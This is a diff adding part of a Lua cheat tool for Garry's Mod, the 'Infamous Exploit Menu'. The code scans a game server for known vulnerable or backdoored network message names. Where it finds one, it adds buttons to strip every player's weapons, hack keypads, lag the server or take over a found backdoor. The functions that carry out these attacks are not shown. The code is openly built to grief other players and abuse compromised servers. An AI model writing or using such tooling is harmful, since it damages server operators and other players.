+    draw.SimpleText( "Infamous Exploit Menu", "Title", ExploitMenu:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
+end
+
+
+local ExploitMenuClose = vgui.Create( "DButton", ExploitMenu )
+ExploitMenuClose:SetSize( 35, 35 )
+ExploitMenuClose:SetPos( ExploitMenu:GetWide() - 36,9 )
+ExploitMenuClose:SetText( "X" )
+ExploitMenuClose:SetFont( "Default" )
+ExploitMenuClose:SetTextColor( Color( 255, 255, 255 ) )
+ExploitMenuClose.Paint = function()
+
+end
+ExploitMenuClose.DoClick = function()
+    CloseEverything()
+end
+
+
+local ExpolitPanelList = vgui.Create( "DScrollPanel", ExploitMenu )
+ExpolitPanelList:Dock( FILL )
+
+
+
+
+
+local status = ValidNetString("properties")
+    if (status) then
+
+    totalExploits = 1 + totalExploits
+
+    local StripWeapons = ExpolitPanelList:Add( "DButton" )
+    StripWeapons:SetText( "Strip Everyones Weapons")
+    StripWeapons:Dock( TOP )
+    StripWeapons:DockMargin( 0, 50, 0, 5 )
+    StripWeapons:SetTextColor( Color( 255, 255, 255 ) )
+    StripWeapons.Paint = function( self, w, h )
+        DrawBlur(StripWeapons, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    end
+    StripWeapons.DoClick = function()
+        removeAll()
+        surface.PlaySound("garrysmod/ui_click.wav")
+        SploitNotify("Stripping Weapons")
+    end
+    print("Explotable Feature Found: Strip Weapons")
+end
+
+
+
+local status = ValidNetString("start_wd_emp")
+    if (status) then
+
+    totalExploits = 1 + totalExploits
+
+    local HackKeypads = ExpolitPanelList:Add( "DButton" )
+    HackKeypads:SetText( "Hack Keypads")
+    HackKeypads:Dock( TOP )
+    HackKeypads:DockMargin( 0, 0, 0, 5 )
+    HackKeypads:SetTextColor( Color( 255, 255, 255 ) )
+    HackKeypads.Paint = function( self, w, h )
+        DrawBlur(HackKeypads, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    end
+    HackKeypads.DoClick = function()
+        HackKeypad()
+        surface.PlaySound("garrysmod/ui_click.wav")
+        SploitNotify("Hacking Keypads")
+    end
+    print("Exploitable Feature Found: Hack Keypads")
+end
+
+
+
+
+local status = ValidNetString("egg")
+    if (status) then
+
+    totalExploits = 1 + totalExploits
+
+    local GiveEasterEgg1 = ExpolitPanelList:Add( "DButton" )
+    GiveEasterEgg1:SetText( "Give Easter Egg")
+    GiveEasterEgg1:Dock( TOP )
+    GiveEasterEgg1:DockMargin( 0, 0, 0, 5 )
+    GiveEasterEgg1:SetTextColor( Color( 255, 255, 255 ) )
+    GiveEasterEgg1.Paint = function( self, w, h )
+        DrawBlur(GiveEasterEgg1, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    end
+    GiveEasterEgg1.DoClick = function()
+        GiveEasterEgg1()
+        surface.PlaySound("garrysmod/ui_click.wav")
+        SploitNotify("Hacking Keypads")
+    end
+    print("Exploitable Feature Found: Find All EasterEggs")
+end
+
+
+-- Exploit 4
+
+
+local status = ValidNetString("steamid2")
+    if (status) then
+
+    totalExploits = 1 + totalExploits
+
+    local Lagger1 = ExpolitPanelList:Add( "DButton" )
+    Lagger1:SetText( "Lagger #1")
+    Lagger1:Dock( TOP )
+    Lagger1:DockMargin( 0, 0, 0, 5 )
+    Lagger1:SetTextColor( Color( 255, 255, 255 ) )
+    Lagger1.Paint = function( self, w, h )
+        DrawBlur(Lagger1, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    end
+    Lagger1.DoClick = function()
+        Lagger1()
+        surface.PlaySound("garrysmod/ui_click.wav")
+        SploitNotify("Starting Lagger #1")
+    end
+    print("Exploitable Feature Found: Lagger #1")
+end
+
+
+
+
+
+
+
+
+
+
+SploitNotify("Welcome " .. ply:GetName())
+
+Infamous:Hide()
+InfamousCategories:Hide()
+ExploitMenu:Hide()
+BackdoorMenu:Hide()
+
+function CloseEverything()
+    Infamous:Hide()
+   InfamousCategories:Hide()
+    ExploitMenu:Hide()
+    BackdoorMenu:Hide()
+end
+
+function closealltabs()
+    Infamous:Hide()
+    ExploitMenu:Hide()
+    BackdoorMenu:Hide()
+end
+
+function OpenInfamousMenu()
+    Infamous:Show()
+    InfamousCategories:Show()
+end
+
+function OpenExploitMenu()
+    ExploitMenu:Show()
+end
+
+
+function OpenBackdoor()
+    BackdoorMenu:Show()
+end
+
+
+
+
+function checkbackdoors()
+    if( ValidNetString("nostrip") ) then
+        BackdoorsFound = 1 + BackdoorsFound 
+        chat.AddText( Color( 255, 255, 255 )," Found Backdoor! - nostrip" )
+        netKey = "nostrip"
+    else
+        chat.AddText( Color( 255, 0, 0 )," Backdoor Not Found - nostrip!" )
+    end
+    if( ValidNetString("Sandbox_Armdupe") ) then
+        BackdoorsFound = 1 + BackdoorsFound 
+        chat.AddText( Color( 255, 255, 255 )," Found Backdoor! - Sandbox_Armdupe" )
+        netKey = "Sandbox_Armdupe"
+    else
+        chat.AddText( Color( 255, 0, 0 )," BackDoor Not Found - Sandbox_Armdupe!" )
+    end
+    if( ValidNetString("Fix_Keypads") ) then
+        BackdoorsFound = 1 + BackdoorsFound 
+        chat.AddText( Color( 255, 255, 255 )," Found Backdoor! - Fix_Keypads" )
+        netKey = "Fix_Keypads"
+    else
+        chat.AddText( Color( 255, 0, 0 )," BackDoor Not Found - Fix_Keypads!" )
+    end
+    if( ValidNetString("Remove_Exploiters") ) then
+        BackdoorsFound = 1 + BackdoorsFound 
+        chat.AddText( Color( 255, 255, 255 )," Found Backdoor! - Remove_Exploiters" )
+        netKey = "Remove_Exploiters"
+    else
+        chat.AddText( Color( 255, 0, 0 )," BackDoor Not Found - Remove_Exploiters!" )
+    end
+	 if( ValidNetString("noclipcloakaesp_chat_text") ) then
+        BackdoorsFound = 1 + BackdoorsFound 
+        chat.AddText( Color( 255, 255, 255 )," Found Backdoor! - noclipcloakaesp_chat_text" )
+        netKey = "noclipcloakaesp_chat_text"
+    else
+        chat.AddText( Color( 255, 0, 0 )," BackDoor Not Found - noclipcloakaesp_chat_text!" )
+    end
+    SploitNotify("Found: ".. BackdoorsFound )
+    chat.AddText("Changed Net String to - ".. netKey )
+end
+
+
+
+
+concommand.Add("infamous_menu", OpenInfamousMenu)
+concommand.Add("infamous_exploits", OpenExploitMenu)
+concommand.Add("infamous_backdoor", OpenBackdoor)
+concommand.Add("infamous_checkbackdoors", checkbackdoors)
+ 
